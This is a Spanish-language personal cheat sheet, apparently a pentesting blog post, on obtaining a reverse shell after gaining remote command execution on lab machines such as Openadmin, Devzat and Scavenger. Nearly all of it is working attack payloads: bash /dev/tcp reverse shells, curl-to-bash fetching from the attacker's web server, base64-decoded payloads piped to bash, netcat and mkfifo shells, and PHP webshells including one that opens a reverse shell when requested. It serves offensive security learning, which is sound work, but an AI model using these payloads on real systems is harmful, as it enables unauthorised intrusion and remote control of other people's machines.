---
title: Conseguir Reverse Shell
author: guiseporaki
date: 2023-02-24
categories: [Linux, Cajon Verde]
tags: [Linux, Reverse Shell]
---
## Maneras de lanzarme una reverse shell

En todos los casos se entiende que tengo ejecución remota de comandos(RCE) y tengo el netcat en escucha por un puerto:
```
> nc -nlvp 443
```
[monkey]:https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

Tienes varias formas de realizar una reverse shell en la página de [monkeypentester][monkey].

Caso 1 - Directo:  
Me pongo en escucha por el 443, entonces en el navegador, después del parámetro/argumento que te permita la ejecución, escribo:  
`?cmd=bash -c 'bash -i >& /dev/tcp/Mi_Ip/puerto 0>&1'`  
Si no te llega la bash prueba a url-encodear el &, url-encodeado sería %26

Caso 2 - Index.html y bash:

Otra forma diferente a la anterior, porque el **bash -i** a veces puede dar problemas por url. Despúes del parámetro que sea:  
`which curl` ,si no está en la máquina, intenta `which wget`  

Ahora si cuento con alguna de ellas me monto un servidor web con python:  
`python -m http.server 80`  
Y en la misma carpeta que comparto el servidor creo un index.html que se ejecutará cuando se conecte la víctima interpretándolo con el bash que indique en el comando. Ese index.html es así:  
``` bash
#!/bin/bash
bash -i >& /dev/tcp/miip/puerto 0>&1
```
Y ahora desde el RCE ejecuto esta instrucción; `curl http://Mi_ip|bash`  
Un ejemplo en la máquina **Openadmin**.  

En máquina **Devzat** se pasa a base64 porque no dispone de curl. Se hace esto: 
```
> base64 -w 0 index.html
```
Y ya desde el RCE:  
`echo <cadenaenBase64>| base64 -d|bash`

Caso 3 - Con Netcat:

`nc -e /bin/bash <miip> 443`  
Si en algún momento ves que no os entabla la reverse shell probar:  
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc MIIP MIPUERTO >/tmp/f`  
Hay casos que nc no tiene la opción -e y tenéis que tirar de el nc antiguo.

Caso 4 - FakeShell:

Contexto: En máquina **Scavenger** tenemos rce via web desde un php de la máquina objetivo. Probamos a lanzarnos una reverse pero no hay manera, tanto con el nc ,con bash -c, con wget, curl..pero nada.  
Asi que s4vi se construye una **fakeshell** con bash.

Caso 5 - Mediante WebShells:

Estructuras tipo webshells mediante subida archivo php:

``` php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
``` php
<?php system($_GET['cmd']); ?>
```
Recuerda que llamas directamente al archivo php que esta alojado dentro de la máquina víctima, seguido del ?cmd=COMANDO  
cmd es el parámetro que le solemos poner pero puede ser cualquier otro.

Recuerda el comando **phpinfo()** para saber que funciones hay deshabilitadas y y cuales no.

Si quisieras lanzar reverse directamente desde el php subido ya no sería webshell, y es así:  
``` php
<?php
   system("bash -c ' bash -i >& /dev/tcp/<miIp>/443 0>&1'");
?>
```
Con llamar al archivo bastaría.











